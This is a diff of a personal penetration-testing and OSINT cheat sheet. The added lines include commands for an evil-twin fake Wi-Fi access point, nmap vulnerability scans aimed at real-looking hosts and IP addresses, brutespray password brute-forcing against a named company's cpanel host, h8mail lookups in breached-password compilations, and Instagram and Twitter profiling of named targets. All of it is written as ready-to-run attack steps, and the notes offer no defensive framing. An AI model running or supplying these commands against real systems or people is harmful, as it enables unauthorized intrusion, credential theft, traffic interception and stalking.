@@ -767,6 +767,7 @@ sudo bash airgeddon.sh
 
 
 --------------------------------------------------------[EVIL-TWIN || FAKE-AP & BRIDGED CONNECTION] -----------------------------------
+
 **** [EVIL TWIN ATTACK]  USERS WILL SEE A FAKE AP THAT THEY CAN CONNECT TO AND ACCESS INTERNET 
 [-- CREATE FAKE AP --]
 * sudo airbase-ng --essid free_wifi -c 11 wlan1mon
@@ -783,6 +784,8 @@ sudo bash airgeddon.sh
 * sudo ifconfig free_wifi_bridge 192.168.1.2 up [configure so its within the subnet] 
 * sudo ifconfig free_wifi_bridge up         
 * sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+
+* 
 ------------------------------------------------------ [BLUETOOTHNESS ------------------------------------------------------
 
  https://null-byte.wonderhowto.com/how-to/bt-recon-snoop-bluetooth-devices-using-kali-linux-0165049/
@@ -915,6 +918,88 @@ ls -al /usr/share/nmap/scripts/
 
 [scripts]
 ls -al /usr/share/nmap/scripts/ 
+
+
+
+--------------------------------------------------- [ OSINT ] -----------------------------------------------
+
+
+ 
+############### SOCIAL MEDIA ######################
+######## OSNIT ###########
+### Social media accounts#####
+Pyhton3 sherlock.py username
+
+###### DEEP OSNIT ### THE HARVESTER #######
+cd /home/frank/the_harvester
+python3 theHarvester.py -d dedicatedglass.com -l 500 -b all
+
+
+online OSNIT
+https://api.wigle.net/
+https://www.nirsoft.net/ (look thins up, powerful tool)
+http://geoiplookup.net/ ### GEO IP LCOATIONS
+tracemyip.org
+inteltechniques.com 
+
+### Osintgram -- INSTAGRAM OSNIT 
+## echo the ig dummy user account and set to .conf file (#3)
+## need to create username.conf, pw.conf and settings.json 
+git clone 'https://github.com/Datalux/Osintgram' 
+pip3 install -r requirements.txt 
+echo 'ig_dummyacct' > username.conf 
+echo 'ig_dummyPass' > pw.conf
+echo '{},' > settings.json 
+python3 main.py ig_TARGET 
+list # displays available commands 
+
+
+###### DEEP OSNIT ### THE HARVESTER #######
+cd /home/frank/the_harvester
+python3 theHarvester.py -d dedicatedglass.com -l 500 -b all
+
+
+#### TWINT --- TWITTER OSNIT 
+# https://null-byte.wonderhowto.com/how-to/mine-twitter-for-targeted-information-with-twint-0193853/
+# [MAN] https://github.com/twintproject/twint
+pip3 install --upgrade -e git+https://github.com/twintproject/twint.git@origin/master#egg=twint
+git clone https://github.com/twintproject/twint.git
+cd twint
+pip3 install -r requirements.txt
+pip3 install twint
+
+sudo twint -h
+twint --help 
+sudo twint -g="34.0343535, -117.23414142,2km" --search 'fish shack' --email --phone  ## find discussinon about a business 
+sudo twint -u realdonaldtrump -g='34.39343535, -118.234234252,2km'
+sudo twint -u realdonaldtrump --search 'loser' -o trump.txt 
+
+## USER RECON --> ACTIVE SOCIAL MEDIA PAGES ##
+git clone 'https://github.com/issamelferkh/userrecon' 
+./userrecon.sh 
+
+git clone 'https://github.com/sherlock-project/sherlock'
+cd sherlock
+python3 -m pip install -r requirements.txt
+python3 sherlock user123
+python3 sherlock user1 user2 user3
+
+#### TO LOOK UP BREACHED PASSWORDS AND USER INFO ##### 
+git clone https://github.com/khast3x/h8mail.git
+apt-get install nodejs
+cd h8mail
+pip3 install -r requirements.txt
+python3 ./h8mail.py -h
+python3 h8mail.py -h
+python3 h8mail.py -t email@tosearch.com -bc 'location_of_your_file/BreachCompilation' --local
+
+### TO RETURN DOMAIN EMAILS ####
+theharvester -d priceline.com -l 1000 -b pgp
+nano targets.txt
+python3 h8mail.py -t '/root/h8mail/targets.txt' -bc '~/BreachCompilation' --local
+
+
+
 
 ------------------------------------------------------[BASICS]---------------------------------------------------
 ****
@@ -1077,6 +1162,53 @@ nmap -iL probed.txt -T5 -oA scans/port_scan.txt -V
 sudo apt install ./discord.deb
 echo "scanning for open ports"
 nmap -iL probed.txt -T5 -oA scans/port_scan.txt -V
+
+############ NMAP #############
+## nmap to return open ports and services -SV (specific device)
+sudo nmap -sV -Pn -v ns8231.hostgator.com (#port knocking)
+Sudo nmap -A -Pn  -v 76.172.85.231
+nmap -sI -v google.com 192.168.50.1                                        2 ⚙
+nmap -sW -v 192.168.50.1
+## nmap to find who's on Lan (subnet) #####
+nmap -sn -v - A--version-intenstity=9 192.168.0.0/24
+  
+## nmap to return mac address
+sudo nmap -sP -n 192.168.0.0/24
+airodump-ng wlx0013eff5483f -c 11
+netdiscover -r 192.168.50.1/24
+airodump-ng wlx0013eff5483f --encrypt wep
+sudo iwlist wlx0013eff5483f scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID'
+
+#### TO GET DEVICES AND DISTANCE
+sudo iw dev wlx0013eff5483f scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
+
+
+##### TO FIND WEP PROTECTION ####
+airodump-ng wlx0013eff5483f --encrypt wep
+
+
+cd /usr/share/nmap/scripts
+nmap --script nmap-vulners/ -sV -sS -Pn -A -v 192.168.50.1/24 --version-intensity=9
+nmap -sV --script=vulscan/vulscan.nse 192.168.50.111
+nmap --script nmap-vulners/ -sV www.securitytrails.com
+nmap --script nmap-vulners/ -sV 11.22.33.44
+nmap --script nmap-vulners/,vulscan/ -sV yourwebsite.com
+nmap -Pn --script vuln 192.168.1.105
+
+## php vulnerability
+nmap -sV --script=http-php-version testphp.vulnweb.com
+
+
+#### BRUTE FORCE ####
+## BRUTESPRAY --> requries nmap fiel
+nmap 192.168.50.1 -oX /home/frank/nmapout.xml
+nmap cpanel.dedicatedglass.com/24 -oX /home/frank/nmap.xml
+
+brutespray --file nmapout.xml --threads 5
+brutespray -file nmapout.xml -t 5 -s ftp
+brutespray --file nmapfuad.xml -U names.txt -P milw0rm-dictionary.txt --threads 5
+brutespray --file nmapfuad.xml -U /home/frank/names.txt -P /home/frank/milw0rm-dictionary.txt --threads 5
+
 
 nmap -Sn xxx.xxx # ping scan 
 nmap -sL # list scan, returns device name 
@@ -1345,23 +1477,6 @@ openssl base64 -in signer -out verifcation.enc
 
 ####################################
 ################################################
-#### TO LOOK UP BREACHED PASSWORDS AND USER INFO ##### 
-git clone https://github.com/khast3x/h8mail.git
-apt-get install nodejs
-cd h8mail
-pip3 install -r requirements.txt
-python3 ./h8mail.py -h
-python3 h8mail.py -h
-python3 h8mail.py -t email@tosearch.com -bc 'location_of_your_file/BreachCompilation' --local
-
-### TO RETURN DOMAIN EMAILS ####
-theharvester -d priceline.com -l 1000 -b pgp
-nano targets.txt
-python3 h8mail.py -t '/root/h8mail/targets.txt' -bc '~/BreachCompilation' --local
-
-
-
-
 
 ################################################
 
@@ -1718,58 +1833,6 @@ pip install -r requirements.txt
 python skiptracer.py -l (phone|email|sn|name|plate)
  
  ######################################
-
- 
-############### SOCIAL MEDIA ######################
-######## OSNIT ###########
-### Social media accounts#####
-Pyhton3 sherlock.py username
-
-online OSNIT
-https://api.wigle.net/
-https://www.nirsoft.net/ (look thins up, powerful tool)
-http://geoiplookup.net/ ### GEO IP LCOATIONS
-tracemyip.org
-inteltechniques.com 
-
-### Osintgram -- INSTAGRAM OSNIT 
-## echo the ig dummy user account and set to .conf file (#3)
-## need to create username.conf, pw.conf and settings.json 
-git clone 'https://github.com/Datalux/Osintgram' 
-pip3 install -r requirements.txt 
-echo 'ig_dummyacct' > username.conf 
-echo 'ig_dummyPass' > pw.conf
-echo '{},' > settings.json 
-python3 main.py ig_TARGET 
-list # displays available commands 
-
-
-#### TWINT --- TWITTER OSNIT 
-# https://null-byte.wonderhowto.com/how-to/mine-twitter-for-targeted-information-with-twint-0193853/
-# [MAN] https://github.com/twintproject/twint
-pip3 install --upgrade -e git+https://github.com/twintproject/twint.git@origin/master#egg=twint
-git clone https://github.com/twintproject/twint.git
-cd twint
-pip3 install -r requirements.txt
-pip3 install twint
-
-sudo twint -h
-twint --help 
-sudo twint -g="34.0343535, -117.23414142,2km" --search 'fish shack' --email --phone  ## find discussinon about a business 
-sudo twint -u realdonaldtrump -g='34.39343535, -118.234234252,2km'
-sudo twint -u realdonaldtrump --search 'loser' -o trump.txt 
-
-
-
-## USER RECON --> ACTIVE SOCIAL MEDIA PAGES ##
-git clone 'https://github.com/issamelferkh/userrecon' 
-./userrecon.sh 
-
-git clone 'https://github.com/sherlock-project/sherlock'
-cd sherlock
-python3 -m pip install -r requirements.txt
-python3 sherlock user123
-python3 sherlock user1 user2 user3
 
 
 ######################################
